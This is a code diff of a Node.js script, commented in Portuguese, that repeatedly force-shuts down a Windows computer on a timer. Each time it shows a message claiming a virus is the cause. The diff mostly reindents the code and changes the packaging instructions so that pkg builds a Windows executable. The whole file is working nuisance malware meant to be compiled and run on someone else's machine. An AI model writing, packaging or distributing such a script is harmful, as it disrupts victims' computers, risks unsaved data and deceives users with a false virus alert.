@@ -1,16 +1,16 @@
 const child_process = require("node:child_process");
 
 const desligarComputador = () => {
-        const comandoDesligar = 'shutdown /s /f /t 10 /c "O seu computador irá desligar por conta de um vírus."'
+    const comandoDesligar = 'shutdown /s /f /t 10 /c "O seu computador irá desligar por conta de um vírus."'
 
-        child_process.exec(comandoDesligar, error => {
-            if (error) {
-                console.error("Ocorreu um erro ao desligar o computador");
-                return;
-            }
+    child_process.exec(comandoDesligar, error => {
+        if (error) {
+            console.error("Ocorreu um erro ao desligar o computador");
+            return;
+        }
 
-            console.log("O computador está desligando...");
-        });
+        console.log("O computador está desligando...");
+    });
 };
 
 desligarComputador();
@@ -30,6 +30,5 @@ setInterval(desligarComputador, INTERVALO_TIMER);
 Para criar um executável do arquivo é necessário instalar o pacote pkg:
 - npm i -g pkg
 Para criar o executável do arquivo utilize o seguinte comando:
-- pkg nomeArquivo.js -o nomeExecutavel
+- pkg -t win nomeArquivo.js -o nomeExecutavel
 */
-
